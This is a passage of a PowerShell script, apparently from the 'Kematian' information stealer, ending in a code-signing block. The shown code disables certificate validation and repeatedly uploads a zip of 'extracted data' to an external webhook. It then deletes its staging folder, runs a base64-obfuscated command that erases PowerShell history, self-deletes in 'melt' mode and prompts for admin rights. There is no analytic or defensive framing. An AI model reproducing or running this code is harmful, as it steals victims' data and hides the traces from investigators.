    class TrustAllCertsPolicy : System.Net.ICertificatePolicy {
    [bool] CheckValidationResult([System.Net.ServicePoint] $a,
                                 [System.Security.Cryptography.X509Certificates.X509Certificate] $b,
                                 [System.Net.WebRequest] $c,
                                 [int] $d) {
           return $true
         }
     }
     [System.Net.ServicePointManager]::CertificatePolicy = [TrustAllCertsPolicy]::new()
        $went_through = $false
        while (-not $went_through) {
            try {
                $httpClient = [Net.Http.HttpClient]::new()
                $multipartContent = [Net.Http.MultipartFormDataContent]::new()
                $fileStream = [IO.File]::OpenRead($zipFilePath)
                $fileContent = [Net.Http.StreamContent]::new($fileStream)
                $fileContent.Headers.ContentType = [Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/zip")
                $multipartContent.Add($fileContent, "file", [System.IO.Path]::GetFileName($zipFilePath))
                $response = $httpClient.PostAsync($webhook, $multipartContent).Result
                $responseContent = $response.Content.ReadAsStringAsync().Result
                Write-Host $responseContent
                $went_through = $true
            }
            catch {
                $sleepTime = Get-Random -Minimum 5 -Maximum 10
                Write-Host "[!] An error occurred, retrying in $sleepTime seconds" -ForegroundColor Yellow
                Start-Sleep -Seconds $sleepTime
            }
        }
        $fileStream.Dispose()
        $httpClient.Dispose()
        $multipartContent.Dispose()
        $fileContent.Dispose()
        Remove-Item "$zipFilePath" -Force
    }
    Write-Host "[!] The extracted data was sent successfully !" -ForegroundColor Green
    # cleanup
    Remove-Item "$env:appdata\Kematian" -Force -Recurse
}

if (CHECK_AND_PATCH -eq $true) {  
    KDMUTEX
    if (!($debug)) {
        CriticalProcess -MethodName InvokeRtlSetProcessIsCritical -IsCritical 0 -Unknown1 0 -Unknown2 0
    }
    $script:SingleInstanceEvent.Close()
    $script:SingleInstanceEvent.Dispose()
    #removes history
    I'E'X([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("UmVtb3ZlLUl0ZW0gKEdldC1QU3JlYWRsaW5lT3B0aW9uKS5IaXN0b3J5U2F2ZVBhdGggLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl")))
    if ($debug) {
        Read-Host -Prompt "Press Enter to continue"
    }
    if ($melt) { 
        try {
            Remove-Item $pscommandpath -force
        }
        catch {}
    }
}
else {
    Write-Host "[!] Please run as admin !" -ForegroundColor Red
    Start-Sleep -s 1
    Request-Admin
}
# SIG # Begin signature block
# MIIWogYJKoZIhvcNAQcCoIIWkzCCFo8CAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB
# gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR
# AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQU5kKkcKGtofPqkdR7fYj/Wr46
# KFigghDvMIIDAjCCAeqgAwIBAgIQQWmfkCdPgq5NjgKQlpxwcjANBgkqhkiG9w0B
# AQsFADAZMRcwFQYDVQQDDA5LZW1hdGlhbiwgSW5jLjAeFw0yNDA1MTIxODM3MTha
# Fw0zNDA1MTIxODQ3MThaMBkxFzAVBgNVBAMMDktlbWF0aWFuLCBJbmMuMIIBIjAN
# BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtlJrIO0fS3oH8OmTeElwKQS0NLUC
# w1qXy7PNTXekVGdQi62mzVELs9Ad+cI2ZjdQB6/kW/LQupzsiN/nRn95qbacZR0o
# Wz1deboWCD22Ua3uX0IvNxXlU3qsVUdkZOym9SOdS9ZNyGiB+S3sBLCO1idY6kYg
# OeRPnriBcyQbG7siQJgfYr9P/iFeNMDNKtwfOLrK4zzOomEUxJylBW3ciHhKLVg9
# sabDWa/3qIgMY1RhPyRNiT0TknFIfsX57fiE/RdeyEEBvcSdy4ktF6sANV9PAUgH
# GW+KBLxtyv/4DyRf90nMDLCVvzhQs+CtuOIIrCrZLqRjSQdPrgEUAe6xGQIDAQAB
# o0YwRDAOBgNVHQ8BAf8EBAMCB4AwEwYDVR0lBAwwCgYIKwYBBQUHAwMwHQYDVR0O
# BBYEFIzsnMOzqKL+dnDEQfmwhy70CqcCMA0GCSqGSIb3DQEBCwUAA4IBAQCm2nV7
# u4hJJnPHTiD49hkSNF0zN95s88K/2GQuyiA0ZyjK/snGC4pfTuQKM+I5xDaahreR
# Meml+4TrHWIPj6zkHOk1HpjKr4qaCMuveoClzgz9PczFPR8kaF1SkGlA840EbvIk
# KBjTw0lfYNXzXD9RQSWjwiAAGLE1r/NuNiFIznOxKb6+j8JwVOjQvm1DGtxQyH+V
# IDaaZELS9MaYIZQlZDE+L1itgYaiRoJcA5Mulxsfh6NbyW0UH3q3t0DR3M5CxAc6
# Sc2Fja9skCQPxiTzEfpC6Urqbe6/abP0x2H8bT3lFhQLfgnZA3+yzwAv5ZXPSjk0
# myzbQ/lUCDe5bW+yMIIG7DCCBNSgAwIBAgIQMA9vrN1mmHR8qUY2p3gtuTANBgkq
# hkiG9w0BAQwFADCBiDELMAkGA1UEBhMCVVMxEzARBgNVBAgTCk5ldyBKZXJzZXkx
# FDASBgNVBAcTC0plcnNleSBDaXR5MR4wHAYDVQQKExVUaGUgVVNFUlRSVVNUIE5l
# dHdvcmsxLjAsBgNVBAMTJVVTRVJUcnVzdCBSU0EgQ2VydGlmaWNhdGlvbiBBdXRo
# b3JpdHkwHhcNMTkwNTAyMDAwMDAwWhcNMzgwMTE4MjM1OTU5WjB9MQswCQYDVQQG
# EwJHQjEbMBkGA1UECBMSR3JlYXRlciBNYW5jaGVzdGVyMRAwDgYDVQQHEwdTYWxm
# b3JkMRgwFgYDVQQKEw9TZWN0aWdvIExpbWl0ZWQxJTAjBgNVBAMTHFNlY3RpZ28g
# UlNBIFRpbWUgU3RhbXBpbmcgQ0EwggIiMA0GCSqGSIb3DQEBAQUAA4ICDwAwggIK
# AoICAQDIGwGv2Sx+iJl9AZg/IJC9nIAhVJO5z6A+U++zWsB21hoEpc5Hg7XrxMxJ
# NMvzRWW5+adkFiYJ+9UyUnkuyWPCE5u2hj8BBZJmbyGr1XEQeYf0RirNxFrJ29dd
# SU1yVg/cyeNTmDoqHvzOWEnTv/M5u7mkI0Ks0BXDf56iXNc48RaycNOjxN+zxXKs
# Lgp3/A2UUrf8H5VzJD0BKLwPDU+zkQGObp0ndVXRFzs0IXuXAZSvf4DP0REKV4TJ
# f1bgvUacgr6Unb+0ILBgfrhN9Q0/29DqhYyKVnHRLZRMyIw80xSinL0m/9NTIMdg
# aZtYClT0Bef9Maz5yIUXx7gpGaQpL0bj3duRX58/Nj4OMGcrRrc1r5a+2kxgzKi7
# nw0U1BjEMJh0giHPYla1IXMSHv2qyghYh3ekFesZVf/QOVQtJu5FGjpvzdeE8Nfw
# KMVPZIMC1Pvi3vG8Aij0bdonigbSlofe6GsO8Ft96XZpkyAcSpcsdxkrk5WYnJee
# 647BeFbGRCXfBhKaBi2fA179g6JTZ8qx+o2hZMmIklnLqEbAyfKm/31X2xJ2+opB
# JNQb/HKlFKLUrUMcpEmLQTkUAx4p+hulIq6lw02C0I3aa7fb9xhAV3PwcaP7Sn1F
# NsH3jYL6uckNU4B9+rY5WDLvbxhQiddPnTO9GrWdod6VQXqngwIDAQABo4IBWjCC
# AVYwHwYDVR0jBBgwFoAUU3m/WqorSs9UgOHYm8Cd8rIDZsswHQYDVR0OBBYEFBqh
# +GEZIA/DQXdFKI7RNV8GEgRVMA4GA1UdDwEB/wQEAwIBhjASBgNVHRMBAf8ECDAG
# AQH/AgEAMBMGA1UdJQQMMAoGCCsGAQUFBwMIMBEGA1UdIAQKMAgwBgYEVR0gADBQ
# BgNVHR8ESTBHMEWgQ6BBhj9odHRwOi8vY3JsLnVzZXJ0cnVzdC5jb20vVVNFUlRy
# dXN0UlNBQ2VydGlmaWNhdGlvbkF1dGhvcml0eS5jcmwwdgYIKwYBBQUHAQEEajBo
# MD8GCCsGAQUFBzAChjNodHRwOi8vY3J0LnVzZXJ0cnVzdC5jb20vVVNFUlRydXN0
# UlNBQWRkVHJ1c3RDQS5jcnQwJQYIKwYBBQUHMAGGGWh0dHA6Ly9vY3NwLnVzZXJ0
# cnVzdC5jb20wDQYJKoZIhvcNAQEMBQADggIBAG1UgaUzXRbhtVOBkXXfA3oyCy0l
# hBGysNsqfSoF9bw7J/RaoLlJWZApbGHLtVDb4n35nwDvQMOt0+LkVvlYQc/xQuUQ
# ff+wdB+PxlwJ+TNe6qAcJlhc87QRD9XVw+K81Vh4v0h24URnbY+wQxAPjeT5OGK/
# EwHFhaNMxcyyUzCVpNb0llYIuM1cfwGWvnJSajtCN3wWeDmTk5SbsdyybUFtZ83J
# b5A9f0VywRsj1sJVhGbks8VmBvbz1kteraMrQoohkv6ob1olcGKBc2NeoLvY3NdK
# 0z2vgwY4Eh0khy3k/ALWPncEvAQ2ted3y5wujSMYuaPCRx3wXdahc1cFaJqnyTdl
# Hb7qvNhCg0MFpYumCf/RoZSmTqo9CfUFbLfSZFrYKiLCS53xOV5M3kg9mzSWmglf
# jv33sVKRzj+J9hyhtal1H3G/W0NdZT1QgW6r8NDT/LKzH7aZlib0PHmLXGTMze4n
# muWgwAxyh8FuTVrTHurwROYybxzrF06Uw3hlIDsPQaof6aFBnf6xuKBlKjTg3qj5
# PObBMLvAoGMs/FwWAKjQxH/qEZ0eBsambTJdtDgJK0kHqv3sMNrxpy/Pt/360KOE
# 2See+wFmd7lWEOEgbsausfm2usg1XTN2jvF8IAwqd661ogKGuinutFoAsYyr4/kK
# yVRd1LlqdJ69SK6YMIIG9TCCBN2gAwIBAgIQOUwl4XygbSeoZeI72R0i1DANBgkq
# hkiG9w0BAQwFADB9MQswCQYDVQQGEwJHQjEbMBkGA1UECBMSR3JlYXRlciBNYW5j
# aGVzdGVyMRAwDgYDVQQHEwdTYWxmb3JkMRgwFgYDVQQKEw9TZWN0aWdvIExpbWl0
# ZWQxJTAjBgNVBAMTHFNlY3RpZ28gUlNBIFRpbWUgU3RhbXBpbmcgQ0EwHhcNMjMw
# NTAzMDAwMDAwWhcNMzQwODAyMjM1OTU5WjBqMQswCQYDVQQGEwJHQjETMBEGA1UE
# CBMKTWFuY2hlc3RlcjEYMBYGA1UEChMPU2VjdGlnbyBMaW1pdGVkMSwwKgYDVQQD
# DCNTZWN0aWdvIFJTQSBUaW1lIFN0YW1waW5nIFNpZ25lciAjNDCCAiIwDQYJKoZI
# hvcNAQEBBQADggIPADCCAgoCggIBAKSTKFJLzyeHdqQpHJk4wOcO1NEc7GjLAWTk
# is13sHFlgryf/Iu7u5WY+yURjlqICWYRFFiyuiJb5vYy8V0twHqiDuDgVmTtoeWB
# IHIgZEFsx8MI+vN9Xe8hmsJ+1yzDuhGYHvzTIAhCs1+/f4hYMqsws9iMepZKGRNc
# rPznq+kcFi6wsDiVSs+FUKtnAyWhuzjpD2+pWpqRKBM1uR/zPeEkyGuxmegN77tN
# 5T2MVAOR0Pwtz1UzOHoJHAfRIuBjhqe+/dKDcxIUm5pMCUa9NLzhS1B7cuBb/Rm7
# HzxqGXtuuy1EKr48TMysigSTxleGoHM2K4GX+hubfoiH2FJ5if5udzfXu1Cf+hgl
# TxPyXnypsSBaKaujQod34PRMAkjdWKVTpqOg7RmWZRUpxe0zMCXmloOBmvZgZpBY
# B4DNQnWs+7SR0MXdAUBqtqgQ7vaNereeda/TpUsYoQyfV7BeJUeRdM11EtGcb+Re
# DZvsdSbu/tP1ki9ShejaRFEqoswAyodmQ6MbAO+itZadYq0nC/IbSsnDlEI3iCCE
# qIeuw7ojcnv4VO/4ayewhfWnQ4XYKzl021p3AtGk+vXNnD3MH65R0Hts2B0tEUJT
# cXTC5TWqLVIS2SXP8NPQkUMS1zJ9mGzjd0HI/x8kVO9urcY+VXvxXIc6ZPFgSwVP
# 77kv7AkTAgMBAAGjggGCMIIBfjAfBgNVHSMEGDAWgBQaofhhGSAPw0F3RSiO0TVf
# BhIEVTAdBgNVHQ4EFgQUAw8xyJEqk71j89FdTaQ0D9KVARgwDgYDVR0PAQH/BAQD
# AgbAMAwGA1UdEwEB/wQCMAAwFgYDVR0lAQH/BAwwCgYIKwYBBQUHAwgwSgYDVR0g
# BEMwQTA1BgwrBgEEAbIxAQIBAwgwJTAjBggrBgEFBQcCARYXaHR0cHM6Ly9zZWN0
# aWdvLmNvbS9DUFMwCAYGZ4EMAQQCMEQGA1UdHwQ9MDswOaA3oDWGM2h0dHA6Ly9j
# cmwuc2VjdGlnby5jb20vU2VjdGlnb1JTQVRpbWVTdGFtcGluZ0NBLmNybDB0Bggr
# BgEFBQcBAQRoMGYwPwYIKwYBBQUHMAKGM2h0dHA6Ly9jcnQuc2VjdGlnby5jb20v
# U2VjdGlnb1JTQVRpbWVTdGFtcGluZ0NBLmNydDAjBggrBgEFBQcwAYYXaHR0cDov
# L29jc3Auc2VjdGlnby5jb20wDQYJKoZIhvcNAQEMBQADggIBAEybZVj64HnP7xXD
# Mm3eM5Hrd1ji673LSjx13n6UbcMixwSV32VpYRMM9gye9YkgXsGHxwMkysel8Cbf
# +PgxZQ3g621RV6aMhFIIRhwqwt7y2opF87739i7Efu347Wi/elZI6WHlmjl3vL66
# kWSIdf9dhRY0J9Ipy//tLdr/vpMM7G2iDczD8W69IZEaIwBSrZfUYngqhHmo1z2s
# IY9wwyR5OpfxDaOjW1PYqwC6WPs1gE9fKHFsGV7Cg3KQruDG2PKZ++q0kmV8B3w1
# RB2tWBhrYvvebMQKqWzTIUZw3C+NdUwjwkHQepY7w0vdzZImdHZcN6CaJJ5OX07T
# jw/lE09ZRGVLQ2TPSPhnZ7lNv8wNsTow0KE9SK16ZeTs3+AB8LMqSjmswaT5qX01
# 0DJAoLEZKhghssh9BXEaSyc2quCYHIN158d+S4RDzUP7kJd2KhKsQMFwW5kKQPqA
# bZRhe8huuchnZyRcUI0BIN4H9wHU+C4RzZ2D5fjKJRxEPSflsIZHKgsbhHZ9e2hP
# jbf3E7TtoC3ucw/ZELqdmSx813UfjxDElOZ+JOWVSoiMJ9aFZh35rmR2kehI/shV
# Cu0pwx/eOKbAFPsyPfipg2I2yMO+AIccq/pKQhyJA9z1XHxw2V14Tu6fXiDmCWp8
# KwijSPUV/ARP380hHHrl9Y4a1LlAMYIFHTCCBRkCAQEwLTAZMRcwFQYDVQQDDA5L
# ZW1hdGlhbiwgSW5jLgIQQWmfkCdPgq5NjgKQlpxwcjAJBgUrDgMCGgUAoHgwGAYK
# KwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkqhkiG9w0BCQMxDAYKKwYBBAGCNwIB
# BDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGCNwIBFTAjBgkqhkiG9w0BCQQxFgQU
# coPlBFuB0Hrgf2MD2+DfJ74LH4cwDQYJKoZIhvcNAQEBBQAEggEApmcOX2VjFW4B
# PIHU9OyTAFmF+S4lHUaIW9QcC/bjyXECKt/gTSkGMztHuFlkb7kPBZNrN4XouaJj
# yjSKlZTFyOCpASxAFFE5Hv0Aruy5yrpIWf4PcsE1p32vGnUffrNYIJgvIHMMfz3s
# ODj3YJNd7wL/cWlWpaG4sPSbwseoF1p3DipmYvhwlVSFbGSi466wYYr7z/nCT0cC
# OUMjgvEEp9TNonviT9RjoZ82lcmYEv1ipJpLhYv+tXuHeQZeCbxbw8b/nGGwzxRt
# C9cyxoMF6TTOmEPugVeocfmlF7I6/xmoyNja92jqDICvp7CzRix70Ou9igPEF1nh
# s998Yf2jMaGCA0swggNHBgkqhkiG9w0BCQYxggM4MIIDNAIBATCBkTB9MQswCQYD
# VQQGEwJHQjEbMBkGA1UECBMSR3JlYXRlciBNYW5jaGVzdGVyMRAwDgYDVQQHEwdT
# YWxmb3JkMRgwFgYDVQQKEw9TZWN0aWdvIExpbWl0ZWQxJTAjBgNVBAMTHFNlY3Rp
# Z28gUlNBIFRpbWUgU3RhbXBpbmcgQ0ECEDlMJeF8oG0nqGXiO9kdItQwDQYJYIZI
# AWUDBAICBQCgeTAYBgkqhkiG9w0BCQMxCwYJKoZIhvcNAQcBMBwGCSqGSIb3DQEJ
# BTEPFw0yNDA1MTMxODMxMjBaMD8GCSqGSIb3DQEJBDEyBDCsPakS+gKWLg36Lh7F
# nD03ViYZ6TYuCAnbe7RjMYCj9aZ9XzGjCfvH6ErJlnYhZLowDQYJKoZIhvcNAQEB
# BQAEggIAPRdHOxhw9cAdOlW8kIkaqw97kGbd85QubwNEgJ/SQ4sB+C5FYYi4onas
# ttRRmw7BjXkmbeAc8eTBnKvMBe+MI/qB+9SkBS/NPfzUqx+UjV0WH5uvBPriqnjw
# VyDZkng/1VK5XUtgFwddmIu0mIs1A9TIk44QOLhTwZbLSf9DinAriSoTlBf+F4MQ
# 9mT56D26kvdO3OQyRoKGc4k4FaL6QByHdhz12GKcktDfV+EC1bRfAB5c3kMIhf9P
# kvtd9Hifw7En2TiGig2haAjzJKvN38gSt4z6g5BJm+Nl43dAm1OwIQy/KNo/zDuL
# 9Gy6ngBiRJ+hRbR5U1JLMhouuZhHolibCQUiEvX34cNP4/2XdxZW1xR63UGGgOTz
# F1DQDgDPWm6KKjNzU39/M+8xxTPRkHB8V19CsQFKmJZBxXBQ3GKXYuMA9gerfcPE
# 57zm/wGsKfpWHx5Xhd8l3mf4XWmNpJQrj0HwNefSR0A76kMfHdEOjJm5U8chwfHR
# coSzErB1xRqvps4Txj2wDQUcoo5pG/XNjgcLWUHWAZz02N5bG0Pc9tlEOjXQWRCl
# o0fJsC90JXRQRnABZxFt+Eir8R58A3OgINuZYXyqekyHllBKQx59unDZKF2PxloG
# eoyV6kKIWPPsQf7nYfe4vBSUfmCtnkzJjd6n0WdHaQucM5k1Pa4=
# SIG # End signature block
